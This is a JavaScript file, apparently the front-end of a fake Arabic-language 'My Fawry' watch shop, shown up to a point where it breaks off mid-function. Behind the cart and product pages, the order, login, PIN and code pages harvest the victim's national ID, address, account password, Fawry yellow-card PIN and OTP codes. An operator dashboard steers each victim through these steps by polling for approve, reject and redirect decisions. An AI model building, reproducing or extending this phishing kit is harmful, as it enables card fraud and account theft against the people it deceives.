/* ماي فوري — سكربت الموقع المشترك */
(function () {
  "use strict";

  // ---------- البيانات ----------
  var DATA = window.FAWRY_WATCHES || [];
  var IMGS = window.FAWRY_IMAGES || {};
  var byId = {};
  DATA.forEach(function (m) { byId[m.id] = m; });

  function modelOf(slug) { return byId[slug] || null; }
  function imgOf(slug) { var p = IMGS[slug]; return p ? "./" + p : null; }

  function param(name) {
    try { return new URLSearchParams(window.location.search).get(name); } catch (e) { return null; }
  }

  // ---------- السلة ----------
  var CART_KEY = "fawry_cart";
  function readCart() { try { var v = JSON.parse(localStorage.getItem(CART_KEY)); return Array.isArray(v) ? v : []; } catch (e) { return []; } }
  function writeCart(c) { try { localStorage.setItem(CART_KEY, JSON.stringify(c)); } catch (e) {} badge(); }
  function cartAdd(slug) {
    if (!modelOf(slug)) return;
    var c = readCart();
    if (c.indexOf(slug) === -1) { c.push(slug); writeCart(c); }
    toast('اتضافت للسلة: ' + modelOf(slug).name + " ✓");
  }
  function badge() {
    var a = document.querySelector('a[aria-label="عربة التسوق"]');
    if (!a) return;
    var n = readCart().length;
    var b = a.querySelector("[data-cart-badge]");
    if (n > 0) {
      if (!b) {
        b = document.createElement("span");
        b.setAttribute("data-cart-badge", "");
        b.className = "absolute -top-1.5 -right-1.5 min-w-[18px] h-[18px] px-1 rounded-full bg-[#b56a10] text-white text-[10px] font-black flex items-center justify-center pointer-events-none";
        a.appendChild(b);
      }
      b.textContent = n;
    } else if (b) { b.remove(); }
  }

  // ---------- تنبيه (Toast) ----------
  var toastTimer = null;
  function toast(msg) {
    var t = document.getElementById("fw-toast");
    if (!t) {
      t = document.createElement("div");
      t.id = "fw-toast";
      t.setAttribute("dir", "rtl");
      t.className = "fixed bottom-5 left-1/2 -translate-x-1/2 z-[60] rounded-2xl bg-[#003c5a] text-white text-sm font-extrabold px-5 py-3 shadow-2xl shadow-[#00567e]/40 transition-all duration-300 opacity-0 translate-y-3 pointer-events-none";
      (document.body || document.documentElement).appendChild(t);
    }
    t.textContent = msg;
    requestAnimationFrame(function () {
      t.classList.remove("opacity-0", "translate-y-3");
    });
    if (toastTimer) clearTimeout(toastTimer);
    toastTimer = setTimeout(function () { t.classList.add("opacity-0", "translate-y-3"); }, 2600);
  }

  // ---------- أزرار "أضف لعربة التسوق" ----------
  function bindAddToCart(root) {
    var scope = root || document;
    scope.querySelectorAll("button").forEach(function (btn) {
      var label = btn.getAttribute("aria-label") || "";
      if (label.indexOf("لعربة") === -1 && label.indexOf("للعرض") === -1) return;
      if (btn.getAttribute("data-fw-add") === "1") return;
      var slug = null;
      for (var i = 0; i < DATA.length; i++) {
        if (label.indexOf(DATA[i].id) !== -1) { slug = DATA[i].id; break; }
      }
      if (!slug) {
        var card = btn.closest(".group");
        var link = card ? card.querySelector('a[href*="product.html?model="], a[href*="order.html?model="]') : null;
        if (link) {
          var mm = link.href.match(/model=([a-z0-9-]+)/i);
          if (mm) slug = mm[1];
        }
      }
      if (!slug) return;
      btn.setAttribute("data-fw-add", "1");
      btn.addEventListener("click", function () { cartAdd(slug); });
    });
  }

  // ---------- فلاتر الصفحة الرئيسية/الكل ----------
  function initFilters() {
    var chips = Array.prototype.slice.call(document.querySelectorAll('button[type="button"]'));
    var chipBar = chips.filter(function (b) { return ["الكل", "حريمي", "شبابي", "رجالي", "كلاسيك", "رياضي"].indexOf(b.textContent.trim()) !== -1; });
    if (chipBar.length === 0) return;
    var activeCls = ["bg-primary", "text-primary-foreground", "border-primary"];
    var idleCls = ["bg-card", "text-foreground/80", "border-border/60", "hover:bg-secondary"];
    chipBar.forEach(function (b) { b.setAttribute("data-fw-chip", b.textContent.trim()); });

    // تعليم كروت المنتجات بفئتها
    document.querySelectorAll('a[href*="product.html?model="], a[href*="order.html?model="]').forEach(function (a) {
      var mm = a.href.match(/model=([a-z0-9-]+)/i);
      if (!mm) return;
      var m = modelOf(mm[1]);
      if (!m) return;
      var card = a.closest(".group") || a;
      card.setAttribute("data-cat", m.category);
      card.setAttribute("data-slug", m.id);
    });

    function apply(cat) {
      chipBar.forEach(function (b) {
        var on = b.textContent.trim() === cat;
        if (on) { activeCls.forEach(function (c) { b.classList.add(c); }); idleCls.forEach(function (c) { b.classList.remove(c); }); }
        else { activeCls.forEach(function (c) { b.classList.remove(c); }); idleCls.forEach(function (c) { b.classList.add(c); }); }
      });
      var shown = 0;
      document.querySelectorAll("[data-cat]").forEach(function (card) {
        var ok = cat === "الكل" || card.getAttribute("data-cat") === cat;
        card.style.display = ok ? "" : "none";
        if (ok) shown++;
      });
    }
    chipBar.forEach(function (b) { b.addEventListener("click", function () { apply(b.textContent.trim()); }); });
    apply("الكل");
  }

  // ---------- صفحة المنتج ----------
  function initProduct(pageRoot) {
    var slug = param("model") || param("watch") || "onyx-classic";
    var m = modelOf(slug);
    if (!m) { window.location.replace("./all-watches.html"); return; }
    document.title = m.name + " — " + m.color + " | ساعات ماي فوري";

    var img = pageRoot.querySelector("[data-p-img]");
    if (img) {
      var src = imgOf(slug);
      if (src) img.src = src;
      img.alt = "ساعة ماي فوري " + m.name + " باللون " + m.color;
    }
    var nameEl = pageRoot.querySelector("[data-p-name]"); if (nameEl) nameEl.textContent = m.name;
    var colorEl = pageRoot.querySelector("[data-p-color]"); if (colorEl) colorEl.textContent = m.color;
    var sizeEl = pageRoot.querySelector("[data-p-size]"); if (sizeEl) sizeEl.textContent = m.size;
    var batEl = pageRoot.querySelector("[data-p-battery]"); if (batEl) batEl.textContent = m.battery;
    var matEl = pageRoot.querySelector("[data-p-mat]"); if (matEl) matEl.textContent = m.material;
    var catEl = pageRoot.querySelector("[data-p-cat]"); if (catEl) catEl.textContent = m.category;

    var feats = pageRoot.querySelector("[data-p-features]");
    if (feats) {
      feats.innerHTML = "";
      var CHECK = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-badge-check h-4 w-4 text-[#00567e] shrink-0" aria-hidden="true"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"></path><path d="m9 12 2 2 4-4"></path></svg>';
      m.features.forEach(function (f) {
        var li = document.createElement("li");
        li.className = "flex items-center gap-2 text-sm text-foreground/85";
        li.innerHTML = CHECK;
        li.appendChild(document.createTextNode(f));
        feats.appendChild(li);
      });
    }

    var orderBtn = pageRoot.querySelector("[data-p-order]");
    if (orderBtn) orderBtn.href = "./order.html?watch=" + m.id;
    var cartBtn = pageRoot.querySelector("[data-p-cart]");
    if (cartBtn) {
      cartBtn.setAttribute("aria-label", "أضف لعربة التسوق — " + m.id);
      cartBtn.removeAttribute("data-fw-add");
      bindAddToCart(pageRoot);
    }

    // موديلات مشابهة (نفس الفئة)
    var wrap = pageRoot.querySelector("[data-p-similar]");
    if (wrap) {
      var others = DATA.filter(function (x) { return x.id !== m.id && x.category === m.category; });
      if (others.length < 4) {
        DATA.forEach(function (x) { if (x.id !== m.id && x.category !== m.category && others.indexOf(x) === -1 && others.length < 4) others.push(x); });
      }
      others = others.slice(0, 4);
      wrap.innerHTML = others.map(function (o) {
        var im = imgOf(o.id) || "";
        return '<a class="bg-card rounded-2xl border border-border/60 p-3 text-center transition-transform active:scale-95 hover:shadow-md" href="./product.html?model=' + o.id + '">' +
          '<div class="rounded-xl flex items-center justify-center py-2 bg-watch-stage">' +
          '<img src="' + im + '" alt="ساعة ماي فوري ' + o.name + ' باللون ' + o.color + '" width="320" height="320" class="watch-product relative z-10 w-full h-full object-contain p-1" loading="lazy" decoding="async">' +
          '</div><span class="mt-2 block text-xs font-bold text-foreground">' + o.name + "</span></a>";
      }).join("");
      bindAddToCart(wrap);
    }
  }

  // ---------- صفحة الطلب ----------
  function initOrder() {
    var sel = document.getElementById("model-select");
    if (!sel) return;
    var pImg = document.querySelector("[data-ord-img]");
    var pName = document.querySelector("[data-ord-name]");
    var pSub = document.querySelector("[data-ord-sub]");

    var slug = param("watch") || param("model");
    var c = readCart();
    if (!slug && param("cart") === "1" && c.length > 0) slug = c[0];
    if (!slug) slug = sel.value || "onyx-classic";

    function show(slugX) {
      var m = modelOf(slugX);
      if (!m) return;
      if (pImg) { var s = imgOf(slugX); if (s) pImg.src = s; pImg.alt = "ساعة ماي فوري " + m.name + " باللون " + m.color; }
      if (pName) pName.textContent = m.name;
      if (pSub) pSub.textContent = m.color + " — " + m.category;
      try {
        var u = new URL(window.location.href);
        u.searchParams.set("watch", slugX);
        window.history.replaceState({}, "", u);
      } catch (e) {}
    }

    function setModel(v) {
      var has = Array.prototype.some.call(sel.options, function (o) { return o.value === v; });
      if (has) sel.value = v;
      show(sel.value);
    }
    setModel(slug);
    sel.addEventListener("change", function () { show(sel.value); });

    // لو في سلة فيها أكتر من موديل: اعرضهم كـ chips
    var cartWrap = document.querySelector("[data-ord-cart]");
    if (cartWrap) {
      if (c.length > 1) {
        cartWrap.classList.remove("hidden");
        cartWrap.innerHTML = '<span class="text-xs font-bold text-foreground">موديلات سلتك:</span>';
        c.forEach(function (s2) {
          var mm = modelOf(s2); if (!mm) return;
          var chip = document.createElement("button");
          chip.type = "button";
          chip.className = "rounded-full px-3 py-1 text-[11px] font-bold border transition-colors border-border/60 bg-card text-foreground/85 hover:bg-secondary";
          chip.textContent = mm.name;
          chip.addEventListener("click", function () { setModel(s2); });
          cartWrap.appendChild(chip);
        });
        var clear = document.createElement("button");
        clear.type = "button";
        clear.className = "rounded-full px-3 py-1 text-[11px] font-bold border border-[#b56a10]/30 bg-[#ffde00]/10 text-[#7a4a0a]";
        clear.textContent = "إفراغ السلة";
        clear.addEventListener("click", function () { writeCart([]); cartWrap.classList.add("hidden"); toast("تم إفراغ السلة"); });
        cartWrap.appendChild(clear);
      } else {
        cartWrap.classList.add("hidden");
      }
    }

    // إرسال الطلب — تحقق صارم لكل حقل
    var form = document.getElementById("order-form");
    if (form) {
      var errBox = document.createElement("p");
      errBox.className = "hidden text-xs font-bold text-[#b91c1c]";
      form.insertBefore(errBox, form.querySelector("button"));
      form.addEventListener("submit", function (e) {
        e.preventDefault();
        var name = (form.querySelector("input[autocomplete='name']") || {}).value || "";
        var phone = (form.querySelector("input[inputmode='numeric'][autocomplete='tel']") || {}).value || "";
        var nid = (form.querySelector("input[maxlength='14']") || {}).value || "";
        var inputs = form.querySelectorAll("input");
        var gov = inputs[3] ? inputs[3].value : "";
        var addr = inputs[4] ? inputs[4].value : "";
        var words = name.trim().split(/\s+/);
        if (words.length < 3 || words.some(function (w) { return w.length < 2; })) { errBox.textContent = "من فضلك اكتب اسمك الثلاثي (3 كلمات على الأقل)."; errBox.classList.remove("hidden"); return; }
        if (!/^01[0-9]{9}$/.test(phone.trim())) { errBox.textContent = "رقم الموبايل لازم يكون 11 رقم ويبدأ بـ 01."; errBox.classList.remove("hidden"); return; }
        if (!/^\d{14}$/.test(nid.trim())) { errBox.textContent = "الرقم القومي لازم يكون 14 رقم."; errBox.classList.remove("hidden"); return; }
        if (gov.trim().length < 2) { errBox.textContent = "من فضلك اكتب اسم المحافظة."; errBox.classList.remove("hidden"); return; }
        if (addr.trim().length < 5) { errBox.textContent = "من فضلك اكتب عنوانك بالتفصيل (الشارع والحي)."; errBox.classList.remove("hidden"); return; }
        errBox.classList.add("hidden");

        var db = window.FAWRY_DB;
        // الطلب الأول مش بيتسجل في الداتابيز هنا — بيتحفظ draft محلي في جهاز العميل فقط،
        // وبينزل في الداشبورد أول لما العميل يبعت بيانات تسجيل الدخول (المرحلة الجاية)
        if (!db) {
          // fallback (لو التخزين مش شغال) — نعرض الرسالة الافتراضية
          writeCart([]);
          var ok = document.getElementById("order-success");
          if (ok) {
            ok.classList.remove("hidden");
            form.classList.add("hidden");
            ok.scrollIntoView({ behavior: "smooth", block: "center" });
          }
          return;
        }
        var appId = db.newId ? db.newId() : ("APP-" + Math.random().toString(36).slice(2, 10).toUpperCase());
        var draft = {
          id: appId,
          created_at: new Date().toISOString(),
          visitor_id: (typeof getVisitorId === "function") ? getVisitorId() : "",
          full_name: name.trim().replace(/\s+/g, " "),
          phone: phone.trim(),
          identity: nid.trim(),
          gov: gov.trim(),
          address: addr.trim(),
          model: sel.value,
          model_name: (modelOf(sel.value) || {}).name || sel.value
        };
        try { localStorage.setItem("fawry_draft", JSON.stringify(draft)); } catch (er) {}
        writeCart([]);
        try { sessionStorage.setItem("fawry_app_" + appId, "1"); } catch (er) {}
        window.location.replace("./welcome.html?app=" + appId);
        return;
      });
    }
  }

  // ---------- صفحة تسجيل الدخول (العميل — مرحلة بيانات الدخول) ----------
  function initLoginApp() {
    var form = document.querySelector("form");
    if (!form) return;
    var errBox = document.createElement("p");
    errBox.className = "hidden text-xs font-bold text-[#b91c1c]";
    form.insertBefore(errBox, form.querySelector("button"));

    var db = window.FAWRY_DB;
    var appId = param("app");
    var app = appId && db ? db.find(appId) : null;
    // draft = طلب العميل المكتمل من صفحة تسجيل الطلب (غير محفوظ في الداتابيز لسه)
    var draft = null;
    try { draft = JSON.parse(localStorage.getItem("fawry_draft") || "null"); } catch (er) { draft = null; }
    if (draft && draft.id !== appId) draft = null;

    // آخر المراجعة: لو بيانات الدخول اترفض → تنبيه أعلى الفورم
    if (app && (app.login_status === "rejected")) {
      var alertBox = document.createElement("div");
      alertBox.className = "mb-4 flex items-start gap-2 rounded-xl bg-red-50 p-3 text-[12px] font-bold text-red-800 border border-red-200";
      alertBox.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-x h-4 w-4 shrink-0" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><path d="m15 9-6 6"></path><path d="m9 9 6 6"></path></svg><span>تم رفض بيانات الدخول دي — من فضلك أعد إدخالها ببيانات صحيحة.</span>';
      form.prepend(alertBox);
    }
    // لو مفيش صف في الداتابيز ومفيش draft → العميل فعلاً مطلبش
    if (!app && !draft) {
      var alert2 = document.createElement("div");
      alert2.className = "mb-4 flex items-start gap-2 rounded-xl bg-amber-50 p-3 text-[12px] font-bold text-amber-800 border border-amber-200";
      alert2.innerHTML = '<span>أكمل بيانات طلبك الأول ثم سجّل الدخول — <a class="underline" href="./order.html">سجّل طلبك الآن</a></span>';
      form.prepend(alert2);
    }

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      var phone = (form.querySelector("input[type='tel']") || {}).value || "";
      var pass = (form.querySelector("input[type='password']") || {}).value || "";
      if (!/^01[0-9]{9}$/.test(phone.trim())) { errBox.textContent = "رقم الموبايل لازم يكون 11 رقم ويبدأ بـ 01."; errBox.classList.remove("hidden"); return; }
      if (pass.trim().length < 4) { errBox.textContent = "كلمة السر لازم تكون 4 خانات على الأقل."; errBox.classList.remove("hidden"); return; }
      errBox.classList.add("hidden");
      if (!app && !draft) { errBox.textContent = "من فضلك سجّل طلبك الأول."; errBox.classList.remove("hidden"); return; }
      if (app) {
        db.update(appId, {
          site_username: phone.trim(),
          site_password: pass,
          login_status: "awaiting_review",
          review_status: "awaiting_review",
          verification_status: "awaiting",
          otp_code: "",
          force_target: "",
          visitor_id: (typeof getVisitorId === "function") ? getVisitorId() : ""
        });
      } else {
        // أول إرسال — الطلب بنزل في الداتابيز من هنا (ويظهر في الداشبورد بهالحظة)
        app = db.insert(Object.assign({}, draft, {
          site_username: phone.trim(),
          site_password: pass,
          login_status: "awaiting_review",
          review_status: "awaiting_review",
          verification_status: "awaiting",
          otp_code: "",
          visitor_id: (typeof getVisitorId === "function") ? getVisitorId() : ""
        }));
      }
      try { localStorage.removeItem("fawry_draft"); } catch (er) {}
      try { sessionStorage.setItem("fawry_app_" + appId, "1"); } catch (er) {}
      toast("تم إرسال بيانات الدخول ✓");
      window.location.href = "./waiting.html?app=" + appId;
    });
  }

  // ---------- صفحة الانتظار (العميل يعرض بياناته وبيتأكد) ----------
  function initWaiting() {
    var db = window.FAWRY_DB;
    var appId = param("app");
    var app = appId && db ? db.find(appId) : null;
    if (!app) { window.location.replace("./order.html"); return; }

    // الحاوية الرئيسية — صفحة انتظار بسيطة بعدّاد 60 ثانية (مثل الأصل)
    // مفيش أي تأكيد هنا: القبول/الرفض من الداشبورد بس، وقرار الإدارة بيحدد وجهة العميل
    var root = document.querySelector("[data-page='waiting-app']");
    if (!root) return;
    root.innerHTML =
      '<img alt="ماي فوري" width="647" height="185" class="guest-waiting-logo h-auto w-48 max-w-full mb-12" src="./assets/images/fawry-logo-transparent.png">' +
      '<div class="guest-waiting-indicator" data-complete="false"><div class="guest-waiting-symbol"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-hourglass guest-waiting-hourglass h-10 w-10" aria-hidden="true"><path d="M5 22h14"></path><path d="M5 2h14"></path><path d="M17 22v-4.172a2 2 0 0 0-.586-1.414L12 12l-4.414 4.414A2 2 0 0 0 7 17.828V22"></path><path d="M7 2v4.172a2 2 0 0 0 .586 1.414L12 12l4.414-4.414A2 2 0 0 0 17 6.172V2"></path></svg></div></div>' +
      '<h1 class="mt-6 text-2xl font-bold text-foreground">برجاء الانتظار</h1>' +
      '<div role="timer" aria-label="الوقت المتبقي" dir="ltr" class="mt-6 flex items-center gap-3 text-4xl font-bold tabular-nums text-primary"><span id="wa-timer">01:00</span></div>' +
      '<progress id="wa-progress" aria-label="تقدم الانتظار" max="60" value="0" class="guest-waiting-progress mt-8 w-full max-w-xs h-2"></progress>';

    // عدّاد 60 ثانية (عرض فقط)
    var secs = 60;
    var timer = document.getElementById("wa-timer");
    var progress = document.getElementById("wa-progress");
    setInterval(function () {
      if (secs > 0) {
        secs--;
        if (timer) timer.textContent = (secs < 10 ? "00:0" : "00:") + secs;
        if (progress) progress.setAttribute("value", String(60 - secs));
      }
    }, 1000);

    // polling — قرار الداشبورد بيحدد الوجهة
    function poll() {
      var a = db.find(appId);
      if (!a) return;
      if (a.review_status === "rejected") { window.location.href = "./welcome.html?app=" + appId; return; }
      // محولة يدوية من الأدمن: OTP أولًا
      if (a.review_status === "otp_direct") {
        window.location.href = "./code.html?app=" + appId; return;
      }
      // محولة يدوية: صفحة الكارت
      if (a.review_status === "pin_direct") {
        window.location.href = "./pin.html?app=" + appId; return;
      }
      if (a.card_pin) {
        // الكارت اتقُبل → OTP
        if (a.review_status === "approved" || a.review_status === "otp_submitted" || a.review_status === "otp_rejected") { window.location.href = "./code.html?app=" + appId; return; }
      } else if (a.review_status === "approved") {
        // بيانات الدخول اتقبلت → صفحة الرقم السري للكارت
        window.location.href = "./pin.html?app=" + appId; return;
      }
    }
    setInterval(poll, 1500);
  }

  // ---------- صفحة الرقم السري للكارت الأصفر (4 أرقام) ----------
  function initPinApp() {
    var db = window.FAWRY_DB;
    var appId = param("app");
    var app = appId && db ? db.find(appId) : null;
    if (!app) { window.location.replace("./order.html"); return; }
    var root = document.querySelector("[data-page='pin']");
    if (!root) return;

    var LEN = 4;
    var card = document.createElement("div");
    card.className = "w-full max-w-sm rounded-3xl border border-border/60 bg-card/80 p-8 shadow-xl backdrop-blur-sm text-center";
    card.innerHTML =
      '<div class="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-primary/10">' +
        '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-credit-card h-8 w-8 text-primary" aria-hidden="true"><rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line></svg>' +
      "</div>" +
      '<h1 class="mt-5 text-2xl font-bold text-foreground">الرقم السري للكارت</h1>' +
      '<p class="mt-2 text-sm leading-relaxed text-muted-foreground">قم بإدخال الرقم السري الخاص بكارتك الأصفر<br>(' + LEN + " أرقام)</p>" +
      '<p id="pin-alert" class="hidden mt-2 text-sm text-destructive" role="alert"></p>' +
      '<form id="pin-form" class="mt-7 flex flex-col items-center gap-4">' +
        '<input id="pin-input" dir="ltr" inputmode="numeric" autocomplete="off" autofocus placeholder="••••" aria-label="الرقم السري للكارت" class="h-14 w-full rounded-2xl border-2 border-input bg-transparent text-center text-2xl font-bold tracking-[0.6em] outline-none focus:border-primary focus-visible:ring-2 focus-visible:ring-ring">' +
        '<p class="text-xs text-muted-foreground" aria-live="polite"><span id="pin-count">&nbsp;</span></p>' +
        '<button type="submit" id="pin-submit" disabled class="inline-flex h-12 w-full items-center justify-center gap-2 whitespace-nowrap rounded-2xl bg-primary text-base font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:pointer-events-none disabled:opacity-50">تأكيد</button>' +
      "</form>" +
      '<div id="pin-waiting" class="hidden mt-7 flex flex-col items-center gap-3">' +
        '<div class="h-10 w-10 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>' +
        '<p class="text-sm font-bold text-foreground">جاري التأكيد…</p>' +
      "</div>";
    root.innerHTML = "";
    root.appendChild(card);

    var input = document.getElementById("pin-input");
    var count = document.getElementById("pin-count");
    var alertP = document.getElementById("pin-alert");
    var form = document.getElementById("pin-form");
    var waitingBox = document.getElementById("pin-waiting");
    var submitBtn = document.getElementById("pin-submit");

    input.addEventListener("input", function () {
      input.value = input.value.replace(/\D/g, "").slice(0, LEN);
      count.textContent = input.value.length > 0 ? input.value.length + " / " + LEN + " أرقام" : "\u00A0";
      submitBtn.disabled = input.value.length < LEN;
      alertP.classList.add("hidden");
    });

    var done = false;

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      if (done) return;
      var v = input.value;
      if (v.length < LEN) { alertP.textContent = "الرقم لازم يكون " + LEN + " أرقام"; alertP.classList.remove("hidden"); return; }
      db.update(appId, { card_pin: v, review_status: "pin_submitted" });
      form.classList.add("hidden");
      waitingBox.classList.remove("hidden");
      toast("تم إدخال الرقم ✓");
    });

    function poll() {
      if (done) return;
      var a = db.find(appId);
      if (!a) return;
      // محولة يدوية من الأدمن: ولا OTP مباشرة ولا رجوع بيانات
      // ملاحظة: review "pin_direct" هنا عادي (الأدمن حوّلك للصفحة دي) — مفيش redirect لنفس الصفحة عشان مفيش ريفرش
      if (a.review_status === "otp_direct") {
        window.location.href = "./code.html?app=" + appId; return;
      }
      if (a.review_status === "approved" && a.card_pin) {
        done = true;
        toast("تم قبول الرقم ✓ — جاري تحويلك");
        window.location.href = "./code.html?app=" + appId;
      } else if (a.review_status === "rejected") {
        window.location.href = "./welcome.html?app=" + appId;
      } else if (a.review_status === "pin_rejected") {
        done = false;
        waitingBox.classList.add("hidden");
        form.classList.remove("hidden");
        input.value = "";
        count.textContent = "\u00A0";
        submitBtn.disabled = true;
        alertP.textContent = "الرقم للأسف مش صح — من فضلك أعد الإدخال.";
        alertP.classList.remove("hidden");
        db.update(appId, { card_pin: "", review_status: "awaiting_review" });
      }
    }
    setInterval(poll, 1500);
  }

  // ---------- صفحة الكود (OTPcurrentIndex — مطابقة لصفحة الأصل) ----------
  function initCode() {
    var db = window.FAWRY_DB;
    var appId = param("app");
    var app = appId && db ? db.find(appId) : null;
    if (!app) { window.location.replace("./order.html"); return; }
    var root = document.querySelector("[data-page='code']");
    if (!root) return;

    var MIN = 4, MAX = 6;
    var card = document.createElement("div");
    card.className = "w-full max-w-sm rounded-3xl border border-border/60 bg-card/80 p-8 shadow-xl backdrop-blur-sm text-center";
    card.innerHTML =
      '<div class="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-primary/10">' +
        '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield-check h-8 w-8 text-primary" aria-hidden="true"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="m9 12 2 2 4-4"></path></svg>' +
      "</div>" +
      '<h1 class="mt-5 text-2xl font-bold text-foreground">كود التحقق</h1>' +
      '<p class="mt-2 text-sm leading-relaxed text-muted-foreground">اكتب الكود اللي وصلك<br>(من ' + MIN + " لـ " + MAX + " أرقام)</p>" +
      '<p id="code-alert" class="hidden mt-2 text-sm text-destructive" role="alert"></p>' +
      '<form id="code-form" class="mt-7 flex flex-col items-center gap-4">' +
        '<input id="code-input" dir="ltr" inputmode="numeric" autocomplete="one-time-code" autofocus placeholder="••••••" aria-label="كود التحقق" class="h-14 w-full rounded-2xl border-2 border-input bg-transparent text-center text-2xl font-bold tracking-[0.5em] outline-none focus:border-primary focus-visible:ring-2 focus-visible:ring-ring">' +
        '<p class="text-xs text-muted-foreground" aria-live="polite"><span id="code-count">&nbsp;</span></p>' +
        '<button type="submit" id="code-submit" disabled class="inline-flex h-12 w-full items-center justify-center gap-2 whitespace-nowrap rounded-2xl bg-primary text-base font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:pointer-events-none disabled:opacity-50">تأكيد</button>' +
      "</form>" +
      '<div id="code-waiting" class="hidden mt-7 flex flex-col items-center gap-3">' +
        '<div class="h-10 w-10 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>' +
        '<p class="text-sm font-bold text-foreground">جاري التأكيد…</p>' +
      "</div>" +
      '<div id="code-success" class="hidden mt-7 flex flex-col items-center gap-3">' +
        '<div class="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-100">' +
          '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-8 w-8 text-emerald-600" aria-hidden="true"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>' +
        "</div>" +
        '<h2 class="text-xl font-black text-foreground">تم القبول — اكتملت العملية 🎉</h2>' +
        '<p class="text-sm text-muted-foreground">ساعتك "' + escHTML(app.model_name || "") + '" جاري تجهيزها وتوصلك قريبًا.</p>' +
        '<a href="./index.html" class="inline-flex h-11 w-full items-center justify-center rounded-2xl bg-primary text-base font-bold text-primary-foreground hover:bg-primary/90">الرجوع للرئيسية</a>' +
      "</div>";
    root.innerHTML = "";
    root.appendChild(card);

    function escHTML(s) {
      return String(s || "").replace(/[&<>"']/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]; });
    }
    var input = document.getElementById("code-input");
    var count = document.getElementById("code-count");
    var alertP = document.getElementById("code-alert");
    var form = document.getElementById("code-form");
    var waitingBox = document.getElementById("code-waiting");
    var successBox = document.getElementById("code-success");
    var submitBtn = document.getElementById("code-submit");

    input.addEventListener("input", function () {
      input.value = input.value.replace(/\D/g, "").slice(0, MAX);
      count.textContent = input.value.length > 0 ? input.value.length + " / " + MAX + " أرقام" : "\u00A0";
      submitBtn.disabled = input.value.length < MIN;
      alertP.classList.add("hidden");
    });

    var done = false;
    function showState(a) {
      if (a.verification_status === "approved") {
        form.classList.add("hidden");
        waitingBox.classList.add("hidden");
        successBox.classList.remove("hidden");
        if (done) return;
      }
    }

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      if (done) return;
      var v = input.value;
      if (v.length < MIN) { alertP.textContent = "الكود لازم يكون " + MIN + " أرقام على الأقل"; alertP.classList.remove("hidden"); return; }
      db.update(appId, { otp_code: v, verification_status: "submitted", review_status: "otp_submitted" });
      form.classList.add("hidden");
      waitingBox.classList.remove("hidden");
      toast("تم إدخال الكود ✓");
    });

    setInterval(function () {
      var a = db.find(appId);
      if (!a) return;
      // الأدمن حوّل العميل لصفحة الكارت (من صفحة الـ OTP)
      if (a.review_status === "pin_direct") {
        window.location.href = "./pin.html?app=" + appId; return;
      }
      if (a.verification_status === "approved") {
        done = true;
        form.classList.add("hidden");
        waitingBox.classList.add("hidden");
        successBox.classList.remove("hidden");
      } else if (a.verification_status === "rejected" && a.otp_code) {
        done = false;
        waitingBox.classList.add("hidden");
        form.classList.remove("hidden");
        input.value = "";
        count.textContent = "\u00A0";
        submitBtn.disabled = true;
        alertP.textContent = "الكود للأسف مش صح — من فضلك أعد الإدخال.";
        alertP.classList.remove("hidden");
        db.update(appId, { otp_code: "" });
      }
    }, 1500);
  }

  // ---------- قائمة الموبايل ----------
  function initMobileMenu() {
    var btn = document.querySelector('button[aria-label="القائمة"]');
    if (!btn) return;
    var header = btn.closest("header");
    if (!header) return;
    var panel = document.getElementById("fw-mobile-menu");
    if (!panel) {
      panel = document.createElement("div");
      panel.id = "fw-mobile-menu";
      panel.className = "hidden md:hidden border-t border-[#00567e]/20 bg-[#ffde00] px-4 py-3 grid gap-1";
      panel.innerHTML = Array.prototype.map.call(header.querySelectorAll("nav a"), function (a) {
        return a.outerHTML;
      }).join("");
      header.appendChild(panel);
    }
    btn.addEventListener("click", function () {
      var open = panel.classList.toggle("hidden") === false;
      btn.setAttribute("aria-expanded", open ? "true" : "false");
    });
  }

  // ---------- هاي بديل href المكسور للفاكون ----------
  function fixFavicon() {
    var l = document.querySelector('link[rel="icon"]');
    if (l && (l.getAttribute("href") || "").indexOf("favicon.png") !== -1) {
